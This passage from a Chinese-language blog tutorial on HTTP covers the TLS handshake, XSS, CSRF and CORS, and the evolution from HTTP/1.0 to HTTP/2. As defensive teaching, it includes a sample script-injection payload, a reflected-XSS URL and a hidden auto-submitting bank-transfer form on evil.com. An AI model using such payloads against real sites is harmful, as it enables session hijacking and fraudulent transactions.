    Client-&gt;&gt;Server: Client Key Exchange (加密后的 Pre-Master Secret)
    Client-&gt;&gt;Server: Change Cipher Spec
    Client-&gt;&gt;Server: Finished (Encrypted)
    deactivate Client

    %% 4. 服务器处理并确认
    activate Server
    note over Server: 1. 用私钥解密，得到 Pre-Master Secret&lt;br/&gt;2. 根据三个随机数生成会话密钥&lt;br/&gt;3. 解密并验证 Finished

    Server-&gt;&gt;Client: Change Cipher Spec
    Server-&gt;&gt;Client: Finished (Encrypted)
    deactivate Server

    %% 5. 握手结束
    Note over Client,Server: 握手结束

    %% 6. 加密通信
    Client-&gt;&gt;Server: Encrypted Application Data (HTTP)
    Server-&gt;&gt;Client: Encrypted Application Data (HTTP)</code></pre>



<p><strong>关于 TLS 1.3 的简化</strong>:</p>
<p>TLS 1.3 对握手过程进行了大幅简化和优化，将握手时间从 2-RTT（两次往返）减少到了 1-RTT，甚至在某些情况下可以实现 0-RTT，极大地提升了 HTTPS 的性能。但其核心思想——安全地协商密钥和验证身份——依然不变。</p>
<hr>
<h2 id="4-常见的-Web-安全威胁"><a href="#4-常见的-Web-安全威胁" class="headerlink" title="4. 常见的 Web 安全威胁"></a>4. 常见的 Web 安全威胁</h2><p>即使使用了 HTTPS 确保了传输层的安全，应用层的漏洞依然可能导致严重的安全问题。以下是三种最常见且与 HTTP 机制紧密相关的 Web 安全威胁。</p>
<hr>
<h3 id="4-1-跨站脚本-XSS-Cross-Site-Scripting"><a href="#4-1-跨站脚本-XSS-Cross-Site-Scripting" class="headerlink" title="4.1 跨站脚本 (XSS - Cross-Site Scripting)"></a>4.1 跨站脚本 (XSS - Cross-Site Scripting)</h3><ul>
<li><strong>攻击原理</strong>:<br>XSS 攻击的核心是<strong>将恶意的 JavaScript 脚本注入到受信任的网页中</strong>，当其他用户访问这个网页时，这些恶意脚本就会在他们的浏览器中执行。攻击者利用的是网站对用户输入内容的<strong>盲目信任和未充分过滤</strong>。</li>
<li><strong>类比</strong>: <strong>在公共留言板上贴小广告</strong>。<br>一个网站有一个留言板，正常用户会在上面写下“今天天气真好”。攻击者却在留言内容中偷偷夹带了一段恶意脚本，比如 <code>&lt;script&gt;alert(&#39;你被攻击了！&#39;)&lt;/script&gt;</code>。当网站展示这条留言时，没有对 <code>&lt;script&gt;</code> 标签进行处理，直接将其作为 HTML 的一部分输出。其他用户浏览器在渲染页面时，就会执行这段脚本。</li>
<li><strong>攻击类型</strong>:<ol>
<li><strong>存储型 XSS</strong>: 恶意脚本被<strong>永久存储</strong>在服务器的数据库中（如文章、评论、用户资料）。每当有用户请求包含该内容的页面时，攻击就会发生。危害最大。</li>
<li><strong>反射型 XSS</strong>: 恶意脚本包含在 URL 的参数中。攻击者通常会诱骗用户点击一个构造好的恶意链接，例如 <code>http://example.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>。服务器将 URL 中的参数直接反射到响应页面中，导致脚本执行。这种攻击是一次性的。</li>
<li><strong>DOM 型 XSS</strong>: 攻击不经过服务器，完全在客户端发生。恶意脚本通过修改页面的 DOM（文档对象模型）结构来触发，例如通过 URL 的片段标识符（<code>#</code>）注入。</li>
</ol>
</li>
<li><strong>危害</strong>:<ul>
<li><strong>窃取 Cookie</strong>: <code>document.cookie</code> 可以获取用户的 Cookie，攻击者可以利用它劫持用户会话，冒充用户身份。</li>
<li><strong>键盘记录</strong>: 监听用户的键盘输入，窃取密码、银行卡等敏感信息。</li>
<li><strong>页面篡改</strong>: 修改网页内容，植入广告、钓鱼表单。</li>
<li><strong>发起恶意请求</strong>: 利用用户的身份向网站发送恶意请求（如删除文章、转账）。</li>
</ul>
</li>
<li><strong>HTTP 相关的防御手段</strong>:<ol>
<li><strong><code>Content-Type</code> 响应头</strong>:<ul>
<li>正确设置 <code>Content-Type</code>（如 <code>application/json</code>, <code>text/plain</code>）并配合 <code>X-Content-Type-Options: nosniff</code> 头部，可以防止浏览器错误地将本应是数据的响应解析为 HTML，从而执行其中的脚本。</li>
</ul>
</li>
<li><strong><code>Content-Security-Policy</code> (CSP) 响应头</strong>:<ul>
<li>这是<strong>防御 XSS 最强大、最现代的手段</strong>。CSP 允许网站管理员定义一个“白名单”，明确告知浏览器哪些来源的脚本、样式、图片等资源是可信的，可以被加载和执行。</li>
<li><strong>示例</strong>: <code>Content-Security-Policy: script-src &#39;self&#39; https://apis.google.com</code></li>
<li>这条策略告诉浏览器：只允许执行来自<strong>同源</strong>（<code>&#39;self&#39;</code>）和 <code>httpsis.google.com</code> 的脚本。任何来自其他地方的脚本（包括内联脚本和 <code>eval</code>）都会被直接阻止。</li>
<li>CSP 能够有效地从根本上杜绝大部分 XSS 攻击。</li>
</ul>
</li>
<li><strong><code>HttpOnly</code> Cookie 属性</strong>:<ul>
<li>在 <code>Set-Cookie</code> 时加上 <code>HttpOnly</code> 标志，可以防止客户端 JavaScript 访问该 Cookie。这使得即使 XSS 攻击成功，攻击者也无法通过 <code>document.cookie</code> 窃取用于会话管理的敏感 Cookie。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h3 id="4-2-跨站请求伪造-CSRF-Cross-Site-Request-Forgery"><a href="#4-2-跨站请求伪造-CSRF-Cross-Site-Request-Forgery" class="headerlink" title="4.2 跨站请求伪造 (CSRF - Cross-Site Request Forgery)"></a>4.2 跨站请求伪造 (CSRF - Cross-Site Request Forgery)</h3><ul>
<li><strong>攻击原理</strong>:<br>CSRF 攻击的核心是<strong>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义发送恶意的 HTTP 请求</strong>。攻击者并不窃取信息，而是<strong>伪造请求</strong>去执行某些操作（如转账、修改密码、发帖）。</li>
<li><strong>类比</strong>: <strong>冒用你的名义写信</strong>。<br>你（用户）已经登录了你的银行网站 (<code>bank.com</code>)，你的浏览器保存了 <code>bank.com</code> 的登录 Cookie。这时，你收到了一个邮件，里面有一个诱人的链接：“点击查看可爱猫咪图片”。你点击后，进入了一个恶意网站 <code>evil.com</code>。这个网站的页面中隐藏了一个自动提交的表单，其目标地址是银行的转账接口，例如：<br><code>&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;attacker_account&quot;&gt; ... &lt;/form&gt;</code><br>当你的浏览器加载这个页面时，会自动提交这个表单。因为请求的目标是 <code>bank.com</code>，浏览器会<strong>自动带上</strong>你之前保存的 <code>bank.com</code> 的 <strong>Cookie</strong>。银行服务器收到这个请求后，检查 Cookie，发现你是合法的登录用户，于是执行了转账操作。整个过程你完全不知情。</li>
<li><strong>关键前提</strong>:<ol>
<li>用户已登录目标网站，且浏览器存有该网站的 Cookie。</li>
<li>用户访问了攻击者构造的恶意页面。</li>
<li>目标网站的敏感操作接口没有对请求来源进行充分验证。</li>
</ol>
</li>
<li><strong>HTTP 相关的防御手段</strong>:<ol>
<li><strong><code>SameSite</code> Cookie 属性</strong>:<ul>
<li>这是<strong>防御 CSRF 最有效、最简单的现代方法</strong>。通过在 <code>Set-Cookie</code> 头部设置 <code>SameSite</code> 属性，可以控制 Cookie 在跨站请求中的发送行为。</li>
<li><code>SameSite=Strict</code>: 完全禁止第三方请求携带 Cookie。在任何从外部网站发起的请求中，Cookie 都不会被发送。防御效果最好，但可能影响某些正常的跨站跳转体验。</li>
<li><code>SameSite=Lax</code>: (现代浏览器默认值) 在大多数跨站请求中（如 <code>POST</code> 表单、<code>&lt;img&gt;</code>、AJAX），不发送 Cookie。但在一些顶层导航（如点击链接 <code>&lt;a&gt;</code>）的 <code>GET</code> 请求中会发送。能防御绝大多数 CSRF 攻击。</li>
<li><code>SameSite=None</code>: 允许在任何跨站请求中发送 Cookie。必须配合 <code>Secure</code> 属性使用。</li>
</ul>
</li>
<li><strong>验证 <code>Origin</code> 和 <code>Referer</code> 请求头</strong>:<ul>
<li>服务器可以检查请求头中的 <code>Origin</code> (指示请求的来源域) 或 <code>Referer</code> (指示请求来源的完整 URL)。如果这些值不是来自可信的域名列表，就拒绝该请求。这是一种简单有效的补充手段。</li>
</ul>
</li>
<li><strong>使用 CSRF Token</strong>:<ul>
<li>在 <code>SameSite</code> 属性普及之前，这是最主流的防御方式。服务器在用户访问表单页面时，生成一个随机的、一次性的 Token，并将其隐藏在表单中。当用户提交表单时，这个 Token 会一起发送到服务器。服务器在处理请求前，会验证这个 Token 是否与自己之前下发的一致。由于攻击者无法获取这个随机 Token，他构造的恶意请求中就不包含合法的 Token，从而被服务器拒绝。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h3 id="4-3-CORS-跨源资源共享"><a href="#4-3-CORS-跨源资源共享" class="headerlink" title="4.3 CORS (跨源资源共享)"></a>4.3 CORS (跨源资源共享)</h3><p>CORS 本身不是一种攻击，而是一种<strong>安全机制</strong>，用于解决浏览器的<strong>同源策略 (Same-Origin Policy, SOP)</strong> 带来的限制。</p>
<ul>
<li><strong>同源策略 (SOP)</strong>:<ul>
<li>这是浏览器最核心、最重要的安全策略。它规定，一个源（<code>origin</code>）的网页脚本，在没有明确授权的情况下，不能访问来自另一个源的资源。</li>
<li><strong>源 (Origin)</strong> 由 <strong>协议 (Scheme) + 主机 (Host) + 端口 (Port)</strong> 三者共同定义。只要有一个不同，就是<strong>跨源 (Cross-Origin)</strong>。</li>
<li>SOP 主要限制的是<strong>脚本发起的 HTTP 请求</strong>（如 AJAX），而像 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等标签的资源加载不受此限制（但脚本也无法读取这些标签加载的跨源内容）。</li>
</ul>
</li>
<li><strong>为什么需要 CORS?</strong>:<br>随着 Web 应用的发展（尤其是前后端分离架构和 API 的兴起），跨源请求变得非常普遍（例如，<code>app.com</code> 的前端代码需要请求 <code>api.com</code> 的数据）。为了在保证安全的前提下实现这种合法的跨源访问，CORS 机制应运而生。</li>
<li><strong>CORS 工作原理</strong>:<br>CORS 是一种基于 <strong>HTTP 头部</strong>的机制，它允许服务器声明哪些源站有权限访问其资源。它将跨源请求分为两类：<ol>
<li><strong>简单请求 (Simple Requests)</strong>:<ul>
<li>满足一定条件的请求（如 <code>GET</code>, <code>HEAD</code>, <code>POST</code> 方法，且 <code>Content-Type</code> 为特定值等）被视为简单请求。</li>
<li>浏览器直接发送请求，并在请求头中自动加入 <code>Origin</code> 字段，表明请求来源。</li>
<li>服务器收到请求后，检查 <code>Origin</code> 值。如果该来源被允许，服务器就在响应头中加入 <code>Access-Control-Allow-Origin: &lt;origin&gt;</code> 或 <code>*</code>。</li>
<li>浏览器检查响应头，如果 <code>Access-Control-Allow-Origin</code> 存在且匹配，就将响应数据交给 JavaScript 处理；否则，就拦截响应，并在控制台报错。</li>
</ul>
</li>
<li><strong>非简单请求 (Preflighted Requests)</strong>:<ul>
<li>不满足简单请求条件的请求（如 <code>PUT</code>, <code>DELETE</code> 方法，或带有自定义请求头），在发送实际请求之前，浏览器会先自动发送一个<strong>预检请求 (Preflight Request)</strong>。</li>
<li><strong>预检请求</strong>使用 <code>OPTIONS</code> 方法，并包含 <code>Access-Control-Request-Method</code> (实际请求的方法) 和 <code>Access-Control-Request-Headers</code> (实际请求的自定义头部) 等头部。</li>
<li>服务器收到预检请求后，根据其策略决定是否允许接下来的实际请求，并通过一系列 <code>Access-Control-Allow-*</code> 响应头（如 <code>Access-Control-Allow-Origin</code>, <code>Access-Control-Allow-Methods</code>, <code>Access-Control-Allow-Headers</code>）来告知浏览器。</li>
<li>如果预检通过，浏览器才会发送真正的、包含业务数据的实际请求。如果预检失败，则实际请求不会被发送。</li>
</ul>
</li>
</ol>
</li>
<li><strong>核心 CORS 响应头</strong>:<ul>
<li><code>Access-Control-Allow-Origin</code>: <strong>必需</strong>。指定允许访问的源。</li>
<li><code>Access-Control-Allow-Methods</code>: 在预检响应中使用，指定允许的 HTTP 方法。</li>
<li><code>Access-control-Allow-Headers</code>: 在预检响应中使用，指定允许的自定义请求头。</li>
<li><code>Access-Control-Allow-Credentials</code>: <code>true</code> 或 <code>false</code>。指示是否允许跨域请求携带 Cookie。</li>
<li><code>Access-Control-Max-Age</code>: 指定预检请求结果的缓存时间（秒）。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="六、HTTP-的演进"><a href="#六、HTTP-的演进" class="headerlink" title="六、HTTP 的演进"></a>六、HTTP 的演进</h1><h2 id="1-HTTP-1-0-的时代"><a href="#1-HTTP-1-0-的时代" class="headerlink" title="1. HTTP&#x2F;1.0 的时代"></a>1. HTTP&#x2F;1.0 的时代</h2><p>HTTP&#x2F;1.0 在 1996 年通过 RFC 1945 正式发布，它是第一个被广泛应用的 HTTP 版本。这个版本的协议设计相对简单，主要目标是满足当时以“图文”为主的网页浏览需求。其核心设计理念是“一次请求-一次响应”，反映了早期 Web 的简单交互模式。</p>
<hr>
<h3 id="1-1-核心特性与局限性"><a href="#1-1-核心特性与局限性" class="headerlink" title="1.1 核心特性与局限性"></a>1.1 核心特性与局限性</h3><h4 id="1-1-1-短连接-Short-lived-Connections"><a href="#1-1-1-短连接-Short-lived-Connections" class="headerlink" title="1.1.1 短连接 (Short-lived Connections)"></a>1.1.1 短连接 (Short-lived Connections)</h4><ul>
<li><strong>特性</strong>: 这是 HTTP&#x2F;1.0 最显著的特点。默认情况下，每一个 HTTP 请求都需要建立一个新的 TCP 连接。在服务器返回响应后，该 TCP 连接会立即关闭。</li>
<li><strong>流程</strong>:<ol>
<li>浏览器请求 <code>index.html</code> -&gt; 建立 TCP 连接 -&gt; 请求 -&gt; 响应 -&gt; <strong>关闭 TCP 连接</strong>。</li>
<li>页面中有一张图片 <code>image.jpg</code> -&gt; 建立新的 TCP 连接 -&gt; 请求 -&gt; 响应 -&gt; <strong>关闭 TCP 连接</strong>。</li>
<li>页面中有一个 CSS 文件 <code>style.css</code> -&gt; 建立新的 TCP 连接 -&gt; 请求 -&gt; 响应 -&gt; <strong>关闭 TCP 连接</strong>。</li>
</ol>
</li>
<li><strong>局限性 (性能瓶颈)</strong>:<ul>
<li><strong>高延迟</strong>: TCP 连接的建立（三次握手）和关闭（四次挥手）本身就需要消耗网络往返时间 (RTT)。对于一个包含大量小文件（图片、脚本）的网页，这种开销会迅速累积，导致页面加载速度非常慢。</li>
<li><strong>服务器压力大</strong>: 频繁地创建和销毁连接，对服务器的 CPU 和内存资源造成了巨大压力。</li>
<li><strong>慢启动惩罚</strong>: TCP 协议有一个“慢启动”机制，即新建立的连接会从一个较低的传输速率开始，然后逐渐提升。短连接意味着每个请求都必须重新经历这个慢启动过程，无法利用已经“热身”完毕的连接，传输效率低下。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-1-2-无-Host-头部-No-Host-Header"><a href="#1-1-2-无-Host-头部-No-Host-Header" class="headerlink" title="1.1.2 无 Host 头部 (No Host Header)"></a>1.1.2 无 Host 头部 (No Host Header)</h4><ul>
<li><p><strong>特性</strong>: 在最初的 HTTP&#x2F;1.0 设计中，请求报文中并<strong>没有 <code>Host</code> 头部</strong>。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 一个典型的 HTTP/1.0 请求</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>NCSA_Mosaic/2.0</span><br></pre></td></tr></table></figure>

<p>请求行中的路径 <code>/index.html</code> 是相对路径，没有指明目标服务器的域名。</p>
</li>
<li><p><strong>局限性</strong>:</p>
<ul>
<li><strong>无法实现虚拟主机 (Virtual Hosting)</strong>: 这意味着<strong>一台服务器（一个 IP 地址）只能托管一个网站</strong>。因为当服务器收到一个请求时，它无法知道客户端想要访问的是哪个域名下的资源。这在 IP 地址资源日益紧张的背景下，是极大的浪费。</li>
<li><strong>背景</strong>: 在互联网早期，域名和 IP 地址几乎是一一对应的，所以这个问题并不突出。但随着 Web 的发展，一个 IP 托管多个网站的需求变得非常迫切。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-1-3-有限的缓存能力"><a href="#1-1-3-有限的缓存能力" class="headerlink" title="1.1.3 有限的缓存能力"></a>1.1.3 有限的缓存能力</h4><ul>
<li><strong>特性</strong>: HTTP&#x2F;1.0 引入了初步的缓存控制机制，主要通过以下两个头部：<ul>
<li><strong><code>Expires</code> (响应头)</strong>: 服务器通过一个绝对的过期时间来告诉浏览器缓存的有效期。</li>
<li><strong><code>If-Modified-Since</code> (请求头) &#x2F; <code>Last-Modified</code> (响应头)</strong>: 用于实现协商缓存。</li>
</ul>
</li>
<li><strong>局限性</strong>:<ul>
<li><code>Expires</code> 依赖于客户端本地时间，如果客户端时间不准，缓存策略就会出错。</li>
<li><code>Last-Modified</code> 的时间精度只能到秒，并且对于内容没变但元数据变动的情况无法正确处理。</li>
<li>缓存控制的指令不够丰富和灵活。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-1-4-简单的请求方法"><a href="#1-1-4-简单的请求方法" class="headerlink" title="1.1.4 简单的请求方法"></a>1.1.4 简单的请求方法</h4><ul>
<li><strong>特性</strong>: HTTP&#x2F;1.0 主要定义了三个请求方法：<ul>
<li><code>GET</code>: 获取资源。</li>
<li><code>POST</code>: 提交数据。</li>
<li><code>HEAD</code>: 获取资源的元信息（头部）。</li>
</ul>
</li>
<li><strong>局限性</strong>: 缺少 <code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>, <code>OPTIONS</code> 等更精细化的操作方法，这使得通过 HTTP 实现符合 RESTful 风格的 API 变得困难。开发者常常需要通过 <code>POST</code> 请求来模拟更新和删除操作。</li>
</ul>
<hr>
<h3 id="1-2-HTTP-1-0-的“改进”与过渡"><a href="#1-2-HTTP-1-0-的“改进”与过渡" class="headerlink" title="1.2 HTTP&#x2F;1.0 的“改进”与过渡"></a>1.2 HTTP&#x2F;1.0 的“改进”与过渡</h3><p>面对上述种种局限，特别是由短连接和无 Host 头带来的严重问题，社区和浏览器厂商在 HTTP&#x2F;1.0 的后期进行了一些非正式的扩展，为向 HTTP&#x2F;1.1 过渡铺平了道路。</p>
<ul>
<li><p><strong><code>Connection: Keep-Alive</code></strong>:</p>
<ul>
<li>一些浏览器和服务器开始支持一个非官方的 <code>Connection: Keep-Alive</code> 头部。</li>
<li>如果客户端在请求中加入这个头部，并且服务器也支持，那么服务器在响应后就不会立即关闭 TCP 连接，从而实现了<strong>长连接（或称持久连接）</strong>。</li>
<li>这大大缓解了短连接带来的性能问题，是 HTTP 性能优化的一个里程碑。</li>
</ul>
</li>
<li><p><strong><code>Host</code> 头部的引入</strong>:</p>
<ul>
<li>为了解决虚拟主机的问题，<code>Host</code> 头部被作为 HTTP&#x2F;1.0 的一个扩展引入，并最终在 HTTP&#x2F;1.1 中成为<strong>必需</strong>的头部。</li>
<li>有了 <code>Host</code> 头部，客户端可以在请求中明确指出要访问的域名，服务器便可以根据这个域名将请求分发到对应的网站。</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 一个带 Host 头的 HTTP/1.0 请求</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>NCSA_Mosaic/2.0</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-HTTP-1-1-至今仍是主流"><a href="#2-HTTP-1-1-至今仍是主流" class="headerlink" title="2. HTTP&#x2F;1.1 (至今仍是主流)"></a>2. HTTP&#x2F;1.1 (至今仍是主流)</h2><p>HTTP&#x2F;1.1 并非对 HTTP&#x2F;1.0 的推倒重来，而是一次意义重大的<strong>增强和完善</strong>。它的设计目标非常明确：<strong>在保持协议简单性的同时，大幅提升性能、可扩展性和功能性</strong>。</p>
<hr>
<h3 id="2-1-主要改进"><a href="#2-1-主要改进" class="headerlink" title="2.1 主要改进"></a>2.1 主要改进</h3><p>HTTP&#x2F;1.1 的核心改进可以概括为以下几点，它们几乎都是针对 HTTP&#x2F;1.0 的痛点进行优化的。</p>
<h4 id="2-1-1-默认长连接-Persistent-Connections"><a href="#2-1-1-默认长连接-Persistent-Connections" class="headerlink" title="2.1.1 默认长连接 (Persistent Connections)"></a>2.1.1 默认长连接 (Persistent Connections)</h4><ul>
<li><strong>改进点</strong>: 这是 HTTP&#x2F;1.1 <strong>最重要的性能改进</strong>。它将 HTTP&#x2F;1.0 中需要手动开启的 <code>Keep-Alive</code> 机制，变为了<strong>默认行为</strong>。</li>
<li><strong>工作方式</strong>: 除非在请求或响应中明确包含 <code>Connection: close</code> 头部，否则 TCP 连接在一次请求-响应周期后会保持打开状态，以便后续的请求可以<strong>复用</strong>这条连接。</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>减少延迟</strong>: 避免了为每个资源都重新进行 TCP 三次握手的开销。</li>
<li><strong>提升效率</strong>: 允许 TCP 连接进入“热身”状态，利用 TCP 慢启动结束后的高速传输阶段。</li>
<li><strong>降低资源消耗</strong>: 减少了客户端和服务器因频繁创建和销毁连接而产生的 CPU 和内存负担。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-2-管道化-Pipelining"><a href="#2-1-2-管道化-Pipelining" class="headerlink" title="2.1.2 管道化 (Pipelining)"></a>2.1.2 管道化 (Pipelining)</h4><ul>
<li><strong>改进点</strong>: 在长连接的基础上，HTTP&#x2F;1.1 引入了“管道化”技术，试图进一步提升效率。</li>
<li><strong>工作方式</strong>: 允许客户端在<strong>收到上一个响应之前</strong>，就连续发送多个 HTTP 请求。这就像把多个请求一次性“塞进”TCP 连接这个管道里，减少了等待响应所浪费的往返时间。<ul>
<li><strong>HTTP&#x2F;1.0 (无管道)</strong>: 请求1 -&gt; 响应1 -&gt; 请求2 -&gt; 响应2 …</li>
<li><strong>HTTP&#x2F;1.1 (管道化)</strong>: 请求1, 请求2, 请求3 -&gt; 响应1, 响应2, 响应3 …</li>
</ul>
</li>
<li><strong>致命缺陷 (队头阻塞)</strong>:<ul>
<li>虽然请求可以一起发送，但服务器<strong>必须严格按照接收请求的顺序来返回响应</strong>。</li>
<li>如果第一个请求（如一个复杂的 API 调用）的处理时间很长，那么即使后续请求（如请求一个小图标）已经处理完毕，也必须排队等待第一个响应发送完成。这就是<strong>队头阻塞 (Head-of-Line Blocking)</strong>。</li>
<li>由于队头阻塞问题以及在代理服务器中实现的复杂性，<strong>现代浏览器默认都禁用了管道化</strong>。所以，管道化在理论上是一个进步，但在实践中几乎没有被成功应用。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-3-Host-头部成为必需"><a href="#2-1-3-Host-头部成为必需" class="headerlink" title="2.1.3 Host 头部成为必需"></a>2.1.3 <code>Host</code> 头部成为必需</h4><ul>
<li><p><strong>改进点</strong>: HTTP&#x2F;1.1 强制要求所有请求报文中<strong>必须包含 <code>Host</code> 头部</strong>。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>带来的好处</strong>:</p>
<ul>
<li><strong>正式支持虚拟主机</strong>: 允许多个不同域名的网站托管在同一台服务器（同一个 IP 地址）上。服务器通过检查 <code>Host</code> 头部，就能知道请求是发往哪个网站的，从而返回正确的内容。这极大地节省了宝贵的 IPv4 地址资源，是现代网站托管服务的基石。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-4-更丰富和强大的缓存控制"><a href="#2-1-4-更丰富和强大的缓存控制" class="headerlink" title="2.1.4 更丰富和强大的缓存控制"></a>2.1.4 更丰富和强大的缓存控制</h4><ul>
<li><strong>改进点</strong>: 引入了全新的 <code>Cache-Control</code> 头部，提供了比 HTTP&#x2F;1.0 的 <code>Expires</code> 更加灵活和强大的缓存控制能力。</li>
<li><strong><code>Cache-Control</code> 的优势</strong>:<ul>
<li><strong>相对时间 (<code>max-age</code>)</strong>: 使用相对时间（如 <code>max-age=3600</code>）代替 <code>Expires</code> 的绝对时间，避免了客户端与服务器时间不一致的问题。</li>
<li><strong>丰富的指令</strong>: 提供了 <code>public</code>, <code>private</code>, <code>no-cache</code>, <code>no-store</code>, <code>must-revalidate</code> 等多种指令，让开发者可以对缓存策略进行精细化控制。</li>
</ul>
</li>
<li><strong><code>ETag</code> 的引入</strong>:<ul>
<li>引入 <code>ETag</code> &#x2F; <code>If-None-Match</code> 这一对头部，作为对 <code>Last-Modified</code> &#x2F; <code>If-Modified-Since</code> 的补充和改进。</li>
<li><code>ETag</code> 基于资源内容的“指纹”，能够更精确地判断资源是否发生变化，解决了 <code>Last-Modified</code> 的时间精度和元数据变动问题。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="2-1-5-增加新的请求方法和状态码"><a href="#2-1-5-增加新的请求方法和状态码" class="headerlink" title="2.1.5 增加新的请求方法和状态码"></a>2.1.5 增加新的请求方法和状态码</h4><ul>
<li><strong>请求方法</strong>: 新增了 <code>PUT</code>, <code>DELETE</code>, <code>OPTIONS</code>, <code>PATCH</code>, <code>TRACE</code>, <code>CONNECT</code> 等方法，使得 HTTP 协议的功能更加完善，能够更好地支持 RESTful API 等应用场景。</li>
<li><strong>状态码</strong>: 增加了更多状态码，如 <code>201 Created</code>, <code>204 No Content</code> 等用于 API 交互，<code>307 Temporary Redirect</code> 对 <code>302</code> 进行了细化，以及 <code>409 Conflict</code>, <code>410 Gone</code> 等更丰富的错误表示。</li>
</ul>
<hr>
<h4 id="2-1-6-支持分块传输编码-Chunked-Transfer-Encoding"><a href="#2-1-6-支持分块传输编码-Chunked-Transfer-Encoding" class="headerlink" title="2.1.6 支持分块传输编码 (Chunked Transfer Encoding)"></a>2.1.6 支持分块传输编码 (Chunked Transfer Encoding)</h4><ul>
<li><strong>改进点</strong>: 允许服务器在<strong>响应生成的同时</strong>，将内容分成一个个“块 (chunk)”来发送，而无需在发送前知道响应体的总大小。</li>
<li><strong>工作方式</strong>: 通过在响应头中加入 <code>Transfer-Encoding: chunked</code> 来启用。每个块包含块大小和块内容，最后一个块是大小为 0 的“结束块”。</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>支持动态内容</strong>: 对于那些需要服务器实时生成、无法预知最终大小的内容（如数据库查询结果、直播流），可以立即开始传输，提升首字节时间 (TTFB)，改善用户体验。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-核心瓶颈：队头阻塞-HOL-Blocking"><a href="#2-2-核心瓶颈：队头阻塞-HOL-Blocking" class="headerlink" title="2.2 核心瓶颈：队头阻塞 (HOL Blocking)"></a>2.2 核心瓶颈：队头阻塞 (HOL Blocking)</h3><p>尽管 HTTP&#x2F;1.1 带来了巨大的进步，但它的核心模型——<strong>一个 TCP 连接在同一时间只能处理一个请求-响应</strong>——并未改变。这导致了其最主要的性能瓶颈：</p>
<ol>
<li><strong>协议层面的队头阻塞</strong>: 如前所述，管道化技术因服务器必须按序响应而失效。</li>
<li><strong>浏览器层面的变通与限制</strong>: 为了缓解队头阻塞，浏览器通常会为每个域名<strong>并发建立多条（通常是 6-8 条）TCP 连接</strong>。这在一定程度上实现了并行请求，但：<ul>
<li><strong>连接数有限</strong>: 浏览器对同域名的并发连接数有限制，超过限制的请求仍然需要排队。</li>
<li><strong>资源浪费</strong>: 建立和维护这些额外的 TCP 连接本身就是一种开销。</li>
<li><strong>竞争带宽</strong>: 多条 TCP 连接之间会相互竞争网络带宽，可能导致整体效率下降。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="3-HTTP-2：性能的巨大飞跃"><a href="#3-HTTP-2：性能的巨大飞跃" class="headerlink" title="3. HTTP&#x2F;2：性能的巨大飞跃"></a>3. HTTP&#x2F;2：性能的巨大飞跃</h2><p>HTTP&#x2F;2 的诞生，源于 Google 在 2009 年推出的实验性协议 <strong>SPDY</strong> (读作 “speedy”)。SPDY 的成功实践证明了其核心思想的有效性，最终被采纳为 HTTP&#x2F;2 标准的基础。HTTP&#x2F;2 引入了几个革命性的新特性，从根本上解决了 HTTP&#x2F;1.1 的性能瓶颈。</p>
<hr>
<h3 id="3-1-二进制分帧-Binary-Framing"><a href="#3-1-二进制分帧-Binary-Framing" class="headerlink" title="3.1 二进制分帧 (Binary Framing)"></a>3.1 二进制分帧 (Binary Framing)</h3><ul>
<li><p><strong>核心变革</strong>: 这是 HTTP&#x2F;2 所有其他性能改进的<strong>基础</strong>。HTTP&#x2F;2 不再使用 HTTP&#x2F;1.1 的纯文本格式报文，而是将所有传输的信息分割为更小的<strong>消息 (Message)</strong> 和<strong>帧 (Frame)</strong>，并采用<strong>二进制格式</strong>进行编码。</p>
</li>
<li><p><strong>HTTP&#x2F;1.1 的文本格式</strong>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /resource HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>优点</strong>: 人类可读，调试方便。</li>
<li><strong>缺点</strong>: 格式不紧凑，解析复杂且容易出错（如需要处理空格、换行符等）。</li>
</ul>
</li>
<li><p><strong>HTTP&#x2F;2 的二进制分帧层</strong>:</p>
<ul>
